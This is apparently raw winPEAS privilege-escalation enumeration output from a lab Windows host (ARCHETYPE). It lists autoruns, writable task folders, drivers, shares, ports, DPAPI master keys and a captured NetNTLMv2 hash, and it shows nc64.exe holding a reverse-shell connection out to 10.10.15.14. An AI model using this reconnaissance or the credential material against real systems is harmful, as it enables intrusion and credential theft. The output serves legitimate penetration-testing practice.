    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: sql_svc [AllAccess]
    File: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: sql_svc [AllAccess]
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
   =================================================================================================


����������͹ Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

����������͹ Device Drivers --Non Microsoft--
� Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#vulnerable-drivers
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys
    VMware vSockets Service - 9.8.17.0 build-16460229 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.16.0 build-14168184 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Pointing USB Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmusbmouse.sys
    VMware Pointing PS/2 Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 8.17.02.0012 - build-17216209 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 8.17.02.0012 - build-17216209 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.8.17.0 build-17274505 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmxnet3.sys
    VMware server memory controller - 7.5.5.0 build-14903665 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys


�����������������������������������͹ Network Information �������������������������������������

����������͹ Network Shares
    ADMIN$ (Path: C:\Windows)
    backups (Path: C:\backups)
    C$ (Path: C:\)
    IPC$ (Path: )

����������͹ Enumerate Network Mapped Drives (WMI)
   Local Name         :       T:
   Remote Name        :       \\Archetype\backups
   Remote Path        :       \\Archetype\backups
   Status             :       Unavailable
   Connection State   :       Disconnected
   Persistent         :       True
   UserName           :
   Description        :       RESOURCE REMEMBERED - Microsoft Windows Network

   =================================================================================================


����������͹ Host File

����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses
    Ethernet0 2[00:50:56:94:6C:62]: 10.129.246.17, fe80::e43d:d171:dfe5:c8dc%7, dead:beef::e43d:d171:dfe5:c8dc / 255.255.0.0
        Gateways: 10.129.0.1, fe80::250:56ff:feb9:ded7%7
        DNSs: 1.1.1.1, 1.0.0.1
        Known hosts:
          10.129.0.1            00-50-56-B9-DE-D7     Dynamic
          10.129.4.192          00-50-56-94-B0-A8     Dynamic
          10.129.182.124        00-50-56-94-F6-BD     Dynamic
          10.129.248.223        00-50-56-94-68-F6     Dynamic
          10.129.255.255        FF-FF-FF-FF-FF-FF     Static
          169.254.169.254       00-00-00-00-00-00     Invalid
          169.254.255.255       00-00-00-00-00-00     Invalid
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          255.255.255.255       FF-FF-FF-FF-FF-FF     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


����������͹ Current TCP Listening Ports
� Check for services restricted from the outside
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         848             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         1728            C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         464             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         936             svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         988             svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         1328            svchost
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         604             services
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         620             lsass
  TCP        10.129.246.17         139           0.0.0.0               0               Listening         4               System
  TCP        10.129.246.17         1433          10.10.15.14           50568           Established       1728            C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
  TCP        10.129.246.17         49678         10.10.15.14           443             Established       2192            C:\Users\sql_svc\Downloads\nc64.exe
  TCP        127.0.0.1             1434          0.0.0.0               0               Listening         1728            C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         848             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        1433          [::]                                        0               Listening         1728            C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         464             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         936             svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         988             svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         1328            svchost
  TCP        [::]                                        49668         [::]                                        0               Listening         604             services
  TCP        [::]                                        49669         [::]                                        0               Listening         620             lsass
  TCP        [::1]                                       1434          [::]                                        0               Listening         1728            C:\Program Files\Microsoft SQL Server\MSSQL14.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
  TCP        [fe80::e43d:d171:dfe5:c8dc%7]               445           [fe80::e43d:d171:dfe5:c8dc%7]               49680           Established       4               System
  TCP        [fe80::e43d:d171:dfe5:c8dc%7]               49680         [fe80::e43d:d171:dfe5:c8dc%7]               445             Established       4               System

����������͹ Current UDP Listening Ports
� Check for services restricted from the outside
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            1376              svchost
  UDP        0.0.0.0               500           *:*                            988               svchost
  UDP        0.0.0.0               4500          *:*                            988               svchost
  UDP        0.0.0.0               5353          *:*                            352               svchost
  UDP        0.0.0.0               5355          *:*                            352               svchost
  UDP        10.129.246.17         137           *:*                            4                 System
  UDP        10.129.246.17         138           *:*                            4                 System
  UDP        127.0.0.1             57383         *:*                            988               svchost

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            1376              svchost
  UDP        [::]                                        500           *:*                            988               svchost
  UDP        [::]                                        4500          *:*                            988               svchost
  UDP        [::]                                        5353          *:*                            352               svchost
  UDP        [::]                                        5355          *:*                            352               svchost

����������͹ Firewall Rules
� Showing only DENY rules (too many ALLOW rules always)
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    False
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data

����������͹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  0
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKLM        EnablePunycode                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings


�����������������������������������͹ Windows Credentials �������������������������������������

����������͹ Checking Windows Vault
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    Not Found

����������͹ Checking Credential manager
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-manager-windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run:
cmdkey /list

����������͹ Saved RDP connections
    Not Found

����������͹ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :
    Block Clipboard Redirection             :
    Block COM Port Redirection              :
    Block Drive Redirection                 :
    Block LPT Port Redirection              :
    Block PnP Device Redirection            :
    Block Printer Redirection               :
    Allow Smart Card Redirection            :

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

����������͹ Recently run commands
    Not Found

����������͹ Checking for DPAPI Master Keys
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    MasterKey: C:\Users\sql_svc\AppData\Roaming\Microsoft\Protect\S-1-5-21-1479773013-2644727484-962428355-1001\6fc21731-a2de-4f1a-aeeb-ed5c000f18ca
    Accessed: 1/19/2020 3:10:06 PM
    Modified: 1/19/2020 3:10:06 PM
   =================================================================================================

    MasterKey: C:\Users\sql_svc\AppData\Roaming\Microsoft\Protect\S-1-5-21-1479773013-2644727484-962428355-1001\9f851a43-e6fe-4ab5-9be0-c931324190ab
    Accessed: 7/26/2021 9:14:39 AM
    Modified: 7/26/2021 9:14:39 AM
   =================================================================================================

    MasterKey: C:\Users\sql_svc\AppData\Roaming\Microsoft\Protect\S-1-5-21-1479773013-2644727484-962428355-1001\f3fb6839-c368-43ab-9bd8-abceed876269
    Accessed: 4/13/2024 7:19:33 AM
    Modified: 4/13/2024 7:19:33 AM
   =================================================================================================


����������͹ Checking for DPAPI Credential Files
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#dpapi
    Not Found

����������͹ Checking for RDCMan Settings Files
� Dump credentials from Remote Desktop Connection Manager https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#remote-desktop-credential-manager
    Not Found

����������͹ Looking for Kerberos tickets
�  https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88
    Not Found

����������͹ Looking for saved Wifi credentials
  [X] Exception: Unable to load DLL 'wlanapi.dll': The specified module could not be found. (Exception from HRESULT: 0x8007007E)
Enumerating WLAN using wlanapi.dll failed, trying to enumerate using 'netsh'
No saved Wifi credentials found

����������͹ Looking AppCmd.exe
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#appcmd-exe
    Not Found
      You must be an administrator to run this check

����������͹ Looking SSClient.exe
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#scclient-sccm
    Not Found

����������͹ Enumerating SSCM - System Center Configuration Manager settings

����������͹ Enumerating Security Packages Credentials
  Version: NetNTLMv2
  Hash:    sql_svc::ARCHETYPE:1122334455667788:80749fd43f76bf27eb1073d4e789a4c2:0101000000000000239ef9b5ae8dda015cfe7a358b3a4f57000000000800300030000000000000000000000000300000fc64a2e5d81ab3bdea3823c6cce350367c0679091b1fe4c76219d6e5943c7a320a00100000000000000000000000000000000000090000000000000000000000

   =================================================================================================



�����������������������������������͹ Browsers Information �������������������������������������

����������͹ Showing saved credentials for Firefox
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Firefox DBs
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Firefox history
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Showing saved credentials for Chrome
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Looking for Chrome DBs
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Looking for GET credentials in Chrome history
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
    Not Found

����������͹ Chrome bookmarks
    Not Found

����������͹ Showing saved credentials for Opera
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Brave Browser
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Showing saved credentials for Internet Explorer (unsupported)
    Info: if no credentials were listed, you might need to close the browser and try again.

����������͹ Current IE tabs
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history
  [X] Exception: System.Reflection.TargetInvocationException: Exception has been thrown by the target of an invocation. ---> System.Runtime.InteropServices.COMException: Class not registered (Exception from HRESULT: 0x80040154 (REGDB_E_CLASSNOTREG))
   --- End of inner exception stack trace ---
   at System.RuntimeType.InvokeDispMethod(String name, BindingFlags invokeAttr, Object target, Object[] args, Boolean[] byrefModifiers, Int32 culture, String[] namedParameters)
   at System.RuntimeType.InvokeMember(String name, BindingFlags bindingFlags, Binder binder, Object target, Object[] providedArgs, ParameterModifier[] modifiers, CultureInfo culture, String[] namedParams)
   at winPEAS.KnownFileCreds.Browsers.InternetExplorer.GetCurrentIETabs()
    Not Found

����������͹ Looking for GET credentials in IE history
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#browsers-history

����������͹ IE favorites
    Not Found


�����������������������������������͹ Interesting files and registry �������������������������������������

����������͹ Putty Sessions
    Not Found

����������͹ Putty SSH Host keys
    Not Found

����������͹ SSH keys in registry
� If you find anything here, follow the link to learn how to decrypt the SSH keys https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#ssh-keys-in-registry
    Not Found

����������͹ SuperPutty configuration files

����������͹ Enumerating Office 365 endpoints synced by OneDrive.

    SID: S-1-5-19
   =================================================================================================

    SID: S-1-5-20
   =================================================================================================

    SID: S-1-5-21-1479773013-2644727484-962428355-1001
   =================================================================================================

    SID: S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
   =================================================================================================

    SID: S-1-5-18
   =================================================================================================


����������͹ Cloud Credentials
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Unattend Files

����������͹ Looking for common SAM & SYSTEM backups

����������͹ Looking for McAfee Sitelist.xml Files

����������͹ Cached GPP Passwords

����������͹ Looking for possible regs with creds
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#inside-the-registry
    Not Found
    Not Found
    Not Found
    Not Found

����������͹ Looking for possible password files in users homes
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

����������͹ Searching for Oracle SQL Developer config files


����������͹ Slack files & directories
  note: check manually if something is found

����������͹ Looking for LOL Binaries and Scripts (can be slow)
�  https://lolbas-project.github.io/
   [!] Check skipped, if you want to run it, please specify '-lolbas' argument

����������͹ Enumerating Outlook download files


����������͹ Enumerating machine and user certificate files


����������͹ Searching known files that can contain creds in home
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files

����������͹ Looking for documents --limit 100--
    Not Found

����������͹ Office Most Recent Files -- limit 50

  Last Access Date           User                                           Application           Document

����������͹ Recent files --limit 70--
    Not Found

����������͹ Looking inside the Recycle Bin for creds files
�  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#credentials-inside-files
    Not Found

����������͹ Searching hidden files or folders in C:\Users home (can be slow)

     C:\Users\Default User
     C:\Users\Default
     C:\Users\All Users

����������͹ Searching interesting files in other users home directories (can be slow)

     Checking folder: c:\users\administrator

   =================================================================================================


����������͹ Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
     File Permissions "C:\Users\sql_svc\Downloads\winPEASx64.exe": sql_svc [AllAccess]
     File Permissions "C:\Users\sql_svc\Downloads\nc64.exe": sql_svc [AllAccess]

����������͹ Looking for Linux shells/distributions - wsl.exe, bash.exe


�����������������������������������͹ File Analysis �������������������������������������

����������͹ Analyzing MariaDB Files (limit 70)

����������͹ Analyzing PostgreSQL Files (limit 70)

����������͹ Analyzing Apache Files (limit 70)

����������͹ Analyzing PHP Sessions Files (limit 70)

����������͹ Analyzing Wordpress Files (limit 70)

����������͹ Analyzing Drupal Files (limit 70)

����������͹ Analyzing Moodle Files (limit 70)

����������͹ Analyzing Tomcat Files (limit 70)

����������͹ Analyzing Mongo Files (limit 70)

����������͹ Analyzing Supervisord Files (limit 70)

����������͹ Analyzing Cesi Files (limit 70)

����������͹ Analyzing Rsync Files (limit 70)

����������͹ Analyzing Hostapd Files (limit 70)

����������͹ Analyzing Wifi Connections Files (limit 70)

����������͹ Analyzing PAM Auth Files (limit 70)

����������͹ Analyzing NFS Exports Files (limit 70)

����������͹ Analyzing Anaconda ks Files (limit 70)

����������͹ Analyzing Racoon Files (limit 70)

����������͹ Analyzing Kubelet Files (limit 70)

����������͹ Analyzing VNC Files (limit 70)

����������͹ Analyzing Ldap Files (limit 70)

����������͹ Analyzing OpenVPN Files (limit 70)

����������͹ Analyzing SSH Files (limit 70)

����������͹ Analyzing Cloud Credentials Files (limit 70)

����������͹ Analyzing Kibana Files (limit 70)

����������͹ Analyzing Knockd Files (limit 70)

����������͹ Analyzing Elasticsearch Files (limit 70)

����������͹ Analyzing CouchDB Files (limit 70)

����������͹ Analyzing Redis Files (limit 70)

����������͹ Analyzing Mosquitto Files (limit 70)

����������͹ Analyzing Neo4j Files (limit 70)

����������͹ Analyzing Cloud Init Files (limit 70)

����������͹ Analyzing Erlang Files (limit 70)

����������͹ Analyzing GMV Auth Files (limit 70)

����������͹ Analyzing IPSec Files (limit 70)

����������͹ Analyzing IRSSI Files (limit 70)

����������͹ Analyzing Keyring Files (limit 70)

����������͹ Analyzing Filezilla Files (limit 70)

����������͹ Analyzing Backup Manager Files (limit 70)

����������͹ Analyzing PGP-GPG Files (limit 70)

����������͹ Analyzing FastCGI Files (limit 70)

����������͹ Analyzing SNMP Files (limit 70)

����������͹ Analyzing Pypirc Files (limit 70)

����������͹ Analyzing Postfix Files (limit 70)

����������͹ Analyzing CloudFlare Files (limit 70)

����������͹ Analyzing Http_conf Files (limit 70)

����������͹ Analyzing Htpasswd Files (limit 70)

����������͹ Analyzing Ldaprc Files (limit 70)

